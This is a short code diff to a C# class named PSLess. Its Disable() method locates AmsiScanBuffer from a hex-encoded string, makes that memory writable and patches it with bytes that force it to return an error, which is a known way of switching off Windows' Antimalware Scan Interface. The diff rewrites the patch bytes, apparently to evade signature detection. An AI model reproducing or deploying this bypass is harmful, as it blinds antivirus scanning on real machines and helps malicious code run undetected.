@@ -50,7 +50,7 @@ class PSLess
     }
     return buffer;
   }
-    public static int Disable()
+   public static int Disable()
           {
             string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
 	    string buffer="";
@@ -69,8 +69,9 @@ class PSLess
             uint p = 0;
 
             VirtualProtect(Address, size, 0x40, out p);
-
-            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            byte c1=0xB8,c2=0x80;
+			 
+            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
             Marshal.Copy(Patch, 0, unmanagedPointer, 6);
             MoveMemory(Address, unmanagedPointer, 6);
